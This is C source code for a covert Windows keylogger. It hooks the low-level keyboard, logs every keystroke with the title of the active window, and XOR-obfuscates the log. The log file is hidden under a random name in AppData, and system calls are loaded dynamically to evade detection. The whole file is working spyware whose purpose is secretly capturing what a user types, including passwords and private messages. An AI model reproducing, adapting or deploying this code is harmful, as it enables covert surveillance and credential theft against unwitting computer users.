#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <windows.h>
#include "types.h"
#include "keylogger/keylogger.h"
#include "keylogger/error.h"
#include "random.h"
#include "memProtect.h"
#include "loadLibrary.h"

#define KEYLOGGER_EMPTY_KEY 0xFFFF

#define KEYLOGGER_KEY_CTRL_L 0xA2
#define KEYLOGGER_KEY_CTRL_R 0xA3
#define KEYLOGGER_KEY_SHIFT_L 0xA0
#define KEYLOGGER_KEY_SHIFT_R 0xA1
#define KEYLOGGER_KEY_CAPS_LOCK 0x14

#define KEYLOGGER_TABLE_CTRL 0x0
#define KEYLOGGER_TABLE_SHIFT 0x1
#define KEYLOGGER_TABLE_CAPS_LOCK 0x2

uint8 keylogger_SpecKey;
char* keylogger_FilePath = NULL;
char keylogger_LastFocusTitle[0xFF];

int keylogger_IsBlocking = 0;
int keylogger_IsRunning = 0;
long keylogger_LastTime = 0;
long keylogger_curTime = 0;
uint8 keylogger_XorKey = 0;
uint16 keylogger_LastKey = KEYLOGGER_EMPTY_KEY;
uint32 keylogger_LastError = KEYLOGGER_NO_ERROR;
FILE* keylogger_F;
HWND keylogger_focus;

HMODULE keylogger_lib;
__SetWindowsHookExA keylogger_lib_SetWindowsHookExA;
__GetMessageA keylogger_lib_GetMessageA;
__TranslateMessage keylogger_lib_TranslateMessage;
__DispatchMessageA keylogger_lib_DispatchMessageA;
__GetKeyState keylogger_lib_GetKeyState;
__CallNextHookEx keylogger_lib_CallNextHookEx;
__GetForegroundWindow keylogger_lib_GetForegroundWindow;
__GetWindowTextA keylogger_lib_GetWindowTextA;

/*
 -> We are not encrypting the data, we are hiding it to look line binary, cuz when open you will se what you typed
*/

int keylogger_isSpec(uint16 key, int isDown)
{
	if(key == KEYLOGGER_KEY_SHIFT_L || key == KEYLOGGER_KEY_SHIFT_R)
	{
		if(isDown)
		{
			keylogger_SpecKey |= 0x1 << KEYLOGGER_TABLE_SHIFT;
		}else{
			keylogger_SpecKey &= ~(0x1 << KEYLOGGER_TABLE_SHIFT);
		}

		return 1;
	}else if(key == KEYLOGGER_KEY_CTRL_L || key == KEYLOGGER_KEY_CTRL_R){
		if(isDown)
		{
			keylogger_SpecKey |= 0x1 << KEYLOGGER_TABLE_CTRL;
		}else{
			keylogger_SpecKey &= ~(0x1 << KEYLOGGER_TABLE_CTRL);
		}

		return 1;
	}else if(key == KEYLOGGER_KEY_CAPS_LOCK && !isDown){
		if((keylogger_SpecKey >> KEYLOGGER_TABLE_CAPS_LOCK) & 0x1)
		{
			keylogger_SpecKey &= ~(0x1 << KEYLOGGER_TABLE_CAPS_LOCK);
		}else{
			keylogger_SpecKey |= 0x1 << KEYLOGGER_TABLE_CAPS_LOCK;
		}

		return 1;
	}

	return 0;
}

void keylogger_writeKey(uint16 key)
{
	uint8 val = (KEYLOGGER_CMD_KEY & 0xF) | (keylogger_SpecKey & 0xF) << 4;
	keylogger_LastKey = (val & 0xFF) | (key & 0xFF) << 8;

	fputc(val ^ keylogger_XorKey, keylogger_F);
	fputc((key & 0xFF) ^ keylogger_XorKey, keylogger_F);
}

void keylogger_hook_addons(void)
{
	time(&keylogger_curTime);
	
	if(keylogger_curTime - keylogger_LastTime > KEYLOGGER_MAX_PAUSE)
	{
		fputc(KEYLOGGER_CMD_TIME ^ keylogger_XorKey, keylogger_F);
		fputc(keylogger_curTime & 0xFF, keylogger_F);
		fputc(((keylogger_curTime >> 8) & 0xFF), keylogger_F);
		fputc(((keylogger_curTime >> 16) & 0xFF) ^ keylogger_XorKey, keylogger_F);
		fputc(((keylogger_curTime >> 24) & 0xFF) ^ keylogger_XorKey, keylogger_F);
	}

	keylogger_LastTime = keylogger_curTime;

	HWND newwin = keylogger_lib_GetForegroundWindow();

	if(keylogger_focus == newwin)
	{
		return;
	}
	
	int bufflen = 0xFE;
	memset(keylogger_LastFocusTitle, 0, 0xFF);

	if(keylogger_lib_GetWindowTextA(newwin, keylogger_LastFocusTitle, bufflen))
	{
		int i;
		int len = strlen(keylogger_LastFocusTitle);

		fputc(KEYLOGGER_CMD_PRG ^ keylogger_XorKey, keylogger_F);
		fputc((len & 0xFF) ^ keylogger_XorKey, keylogger_F);

		for(i = 0; i != len; i++)
		{
			fputc(keylogger_LastFocusTitle[i] ^ keylogger_XorKey, keylogger_F);
		}
	}else{
		keylogger_LastError = KEYLOGGER_ERROR_FOCUS_TITLE;
	}

	keylogger_focus = newwin;
}

long __stdcall keylogger_hook(int code, WPARAM wParam, LPARAM lParam)
{
	if(keylogger_IsBlocking)
	{
		return keylogger_lib_CallNextHookEx(NULL, code, wParam, lParam);
	}

	keylogger_hook_addons();

	uint16 pkey = KEYLOGGER_EMPTY_KEY;

	KBDLLHOOKSTRUCT *pKeyb = (KBDLLHOOKSTRUCT *)lParam;

	if(wParam == WM_KEYUP)
	{
		pkey = pKeyb->vkCode & 0xFF;

		keylogger_isSpec(pkey, 0);
	}else if(wParam == WM_KEYDOWN){
		pkey = pKeyb->vkCode & 0xFF;
		
		if(!keylogger_isSpec(pkey, 1))
		{
			keylogger_writeKey(pkey);
		}
	}

	return keylogger_lib_CallNextHookEx(NULL, code, wParam, lParam);
}

ulong __stdcall keylogger_thread(void* args)
{
	MSG msg;
	HINSTANCE instc = GetModuleHandle(NULL);

	if(!keylogger_lib_SetWindowsHookExA(WH_KEYBOARD_LL, keylogger_hook, instc, 0))
	{
		keylogger_LastError = KEYLOGGER_ERROR_SET_HOOK;

		return 0;
	}

	keylogger_IsRunning = 1;

	if((keylogger_lib_GetKeyState(KEYLOGGER_KEY_CAPS_LOCK) & 0x0001) != 0)
	{
		keylogger_SpecKey |= 0x1 << KEYLOGGER_TABLE_CAPS_LOCK;
	}

	while(keylogger_lib_GetMessageA(&msg, NULL, 0, 0))
	{
		if(keylogger_IsBlocking)
		{
			KEYLOGGER_BLOCK_CPU_PROTECT();

			continue;
		}

		keylogger_lib_TranslateMessage(&msg);
		keylogger_lib_DispatchMessageA(&msg);
	}

	return 0;
}

void keylogger_Setup(void)
{
	if(!keylogger_XorKey)
	{
		keylogger_XorKey = 1 + rand() % 0xFE;
		fputc(KEYLOGGER_CMD_XOR_KEY, keylogger_F);
		fputc(keylogger_XorKey, keylogger_F);

		return;
	}

	keylogger_XorKey = 1 + rand() % 0xFE;
	fputc(KEYLOGGER_CMD_XOR_KEY, keylogger_F);
	fputc(keylogger_XorKey, keylogger_F);
}

int keylogger_GetFile(void)
{
	if(keylogger_FilePath)
	{
		free(keylogger_FilePath);
	}

	char* _appPath = (char*)memProtect_Request(MEMPROTECT_APPDATA);
	char* appPath = getenv(_appPath);
	free(_appPath);
	
	if(!appPath)
	{
		keylogger_LastError = KEYLOGGER_ERROR_GET_APPDATA;

		return 0;
	}

	int appPathLen = strlen(appPath);
	int dirPathLen = appPathLen + 10;
	char* dirPath = malloc(dirPathLen + sizeof(char));
	memset(dirPath, 0, dirPathLen + sizeof(char));
	strcpy(dirPath, appPath);
	strcpy(dirPath + appPathLen, "\\..\\Local\\");

	DIR *dir = opendir(dirPath);

	if(!dir)
	{
		keylogger_LastError = KEYLOGGER_ERROR_GET_APPDATA;
		free(dirPath);

		return 0;
	}

	struct stat fbuf;
	struct dirent *_dir;
	int pathLen = 0;
	char* path = NULL;
	uint8 sigil[KEYLOGGER_SIGIL_LEN];

	while((_dir = readdir(dir)) != NULL)
	{
		pathLen = dirPathLen + _dir->d_namlen;
		path = malloc(pathLen + sizeof(char));
		memset(path, 0, pathLen + sizeof(char));
		strcpy(path, dirPath);
		strcpy(path + dirPathLen, _dir->d_name);

		if(stat(path, &fbuf) == 0)
		{
			if(S_ISREG(fbuf.st_mode))
			{
				keylogger_F = fopen(path, "rb");
				
				if(keylogger_F && fbuf.st_size >= KEYLOGGER_SIGIL_LEN)
				{
					memset(sigil, 0, KEYLOGGER_SIGIL_LEN);
					fread(sigil, 1, KEYLOGGER_SIGIL_LEN, keylogger_F);

					if(memcmp(sigil, KEYLOGGER_SIGIL, KEYLOGGER_SIGIL_LEN) == 0)
					{
						free(dirPath);
						fclose(keylogger_F);
						closedir(dir);

						keylogger_F = fopen(path, "a+");
						keylogger_FilePath = malloc(pathLen + sizeof(char));
						memset(keylogger_FilePath, 0, pathLen + sizeof(char));
						strcpy(keylogger_FilePath, path);
						free(path);

						fseek(keylogger_F, 0, SEEK_END);

						return 1;
					}
				}
			}
		}
		
		free(path);
	}

	closedir(dir);

	pathLen = dirPathLen + 10;
	char* rndName = random_Ascii(10);
	path = malloc(pathLen + sizeof(char));
	memset(path, 0, pathLen);
	strcpy(path, dirPath);
	strcpy(path + dirPathLen, rndName);
	free(rndName);
	free(dirPath);

	keylogger_F = fopen(path, "w");

	if(!keylogger_F)
	{
		keylogger_LastError = KEYLOGGER_ERROR_GET_APPDATA;
		free(path);

		return 0;
	}

	fclose(keylogger_F);

	SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);

	keylogger_F = fopen(path, "a+");
	fwrite(KEYLOGGER_SIGIL, 1, KEYLOGGER_SIGIL_LEN, keylogger_F);

	keylogger_FilePath = malloc(pathLen + sizeof(char));
	memset(keylogger_FilePath, 0, pathLen + sizeof(char));
	strcpy(keylogger_FilePath, path);
	free(path);

	return 1;
}

void keylogger_Start(void)
{
	keylogger_LastError = KEYLOGGER_NO_ERROR;

	if(!keylogger_lib)
	{
		keylogger_lib = loadLibrary_Load(lib_User32);

		if(!keylogger_lib)
		{
			return;
		}

		keylogger_lib_SetWindowsHookExA = (__SetWindowsHookExA)loadLibrary_LoadFunc(keylogger_lib, lib_SetWindowsHookExA);
		keylogger_lib_GetMessageA = (__GetMessageA)loadLibrary_LoadFunc(keylogger_lib, lib_GetMessageA);
		keylogger_lib_TranslateMessage = (__TranslateMessage)loadLibrary_LoadFunc(keylogger_lib, lib_TranslateMessage);
		keylogger_lib_DispatchMessageA = (__DispatchMessageA)loadLibrary_LoadFunc(keylogger_lib, lib_DispatchMessageA);
		keylogger_lib_GetKeyState = (__GetKeyState)loadLibrary_LoadFunc(keylogger_lib, lib_GetKeyState);
		keylogger_lib_CallNextHookEx = (__CallNextHookEx)loadLibrary_LoadFunc(keylogger_lib, lib_CallNextHookEx);
		keylogger_lib_GetWindowTextA = (__GetWindowTextA)loadLibrary_LoadFunc(keylogger_lib, lib_GetWindowTextA);
		keylogger_lib_GetForegroundWindow = (__GetForegroundWindow)loadLibrary_LoadFunc(keylogger_lib, lib_GetForegroundWindow);
	}

	int i;

	for(i = 0; i != 10; i++)
	{
		if(keylogger_GetFile())
		{
			break;
		}
	}

	if(i >= 10)
	{
		return;
	}

	keylogger_SpecKey = 0x0;

	keylogger_Setup();
	keylogger_hook_addons();
	
	if(!CreateThread(NULL, 0, keylogger_thread, NULL, 0, NULL))
	{
		keylogger_LastError = KEYLOGGER_ERROR_CREATE_THREAD;
	}
}